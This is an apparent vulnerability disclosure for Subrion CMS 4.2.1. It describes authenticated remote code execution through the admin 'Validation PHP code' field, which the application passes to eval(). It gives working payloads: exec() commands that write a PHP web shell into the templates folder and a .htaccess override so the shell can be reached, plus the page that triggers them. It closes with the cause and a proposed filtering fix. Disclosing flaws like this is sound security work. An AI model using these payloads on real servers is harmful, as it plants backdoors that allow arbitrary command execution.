| Remote code execution vulnerabilities in the background Affected version   * subrion 4.2.1 lates   login address  ``` http://loacalhost/panel  ```  Find `Fields` after login [image](https://user-images.githubusercontent.com/49431478/140000840-a5d55fda-68d0-4fa2-9e49-3269ecaa9149.png)  On the right are the operations related to the column, choose one here, select `Facebook` [image](https://user-images.githubusercontent.com/49431478/140000872-2b724d5b-87c6-48e8-9616-b0f84c880f6f.png)  open `Required field` [image](https://user-images.githubusercontent.com/49431478/140000900-bca1c282-4407-4290-8fd1-85891c8358b9.png)  `Validation PHP code` can enter any php code, here is a sentence of Trojan  ``` exec('echo ^<?php eval($_GET["aa"]); ?^> >./templates/shell.php');  ```  Then visit  ``` http://loacalhost/profile/?edit  ```  This code written will be triggered when the corresponding column is modified [image](https://user-images.githubusercontent.com/49431478/140000949-17737527-b385-4075-b634-b9dd6b4630eb.png)  But due to the `.htaccess` file under the root path, we cannot directly access the shell [image](https://user-images.githubusercontent.com/49431478/140000966-e8c416c5-4d00-42c6-8c0b-d6d2b8044741.png) [image](https://user-images.githubusercontent.com/49431478/140001012-ab88b185-9459-4fe5-88f7-ee63129e4100.png)  we can write a `.htaccess` file in the same directory of the shell to bypass  In the same way, execute  ``` exec('echo ^<IfModule mod_rewrite.c^> >./templates/.htaccess');exec('echo RewriteEngine Off  ^</IfModule^> >>./templates/.htaccess');  ```  Then go to `/profile/?edit` to trigger it [image](https://user-images.githubusercontent.com/49431478/140001035-c51a8751-5ff7-41fc-bc63-e2f9d09b8d1e.png)  At this time, you can access the shell and execute any command [image](https://user-images.githubusercontent.com/49431478/140001056-acfc0b71-b924-4622-bc72-81e4be4f003b.png) principle The reason is that the code at the background `Fields` will be written to the database [image](https://user-images.githubusercontent.com/49431478/140001214-ab734a1c-f211-4af9-bdc2-f1b8e6105c6f.png)  Then when the information is modified, the data in it will be executed through `eval()` [image](https://user-images.githubusercontent.com/49431478/140001181-600d6ddb-30bf-4911-b01d-98fcaf99dc99.png) Proposed changes The incoming `Validation PHP code` adds filtering for sensitive functions, such as `exec()`, `system()`, etc. |
